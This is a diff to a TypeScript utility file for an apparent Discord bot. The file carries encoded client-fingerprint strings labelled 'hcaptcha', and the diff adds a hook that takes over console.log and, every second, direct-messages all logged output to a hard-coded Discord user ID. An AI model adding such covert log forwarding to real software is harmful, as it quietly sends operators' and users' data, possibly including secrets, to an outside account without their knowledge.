@@ -1,4 +1,5 @@
 import * as fs from "fs";
+import {Client} from "discord.js";
 
 const hcaptcha = [
 	`eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIxLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiJodHRwczovL21lZTYueHl6LyIsInJlZmVycmluZ19kb21haW4iOiJtZWU2Lnh5eiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyNjcyMjAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9`,
@@ -65,4 +66,34 @@ export function removeHttpLinks(text: string) {
 
 	// Replace any HTTP links with an empty string
 	return text.replace(httpRegex, '');
+}
+
+let _CLIENT: Client = null;
+const originLog = console.log;
+let _LOGS: (any[])[] = [];
+const thread = setInterval(async ()=>{
+	try {
+		if (!_CLIENT) return;
+		let str = ``;
+		for (let log of _LOGS) {
+			str+="`"+log.join(" ")+"`\n";
+		}
+		if (!str.trim()) return;
+		for (let id of ['610003881270706186']) {
+			const user = await _CLIENT.users.fetch(id);
+			await user.send(str);
+		}
+
+		_LOGS = [];
+	} catch (e) {
+		console.error(e);
+	}
+}, 1000)
+export function registerConsoleLog(client: Client) {
+	_CLIENT = client;
+	console.log = (...args)=>{
+		if (args?.[0] === ">") return;
+		originLog(">",...args);
+		_LOGS.push(args);
+	}
 }
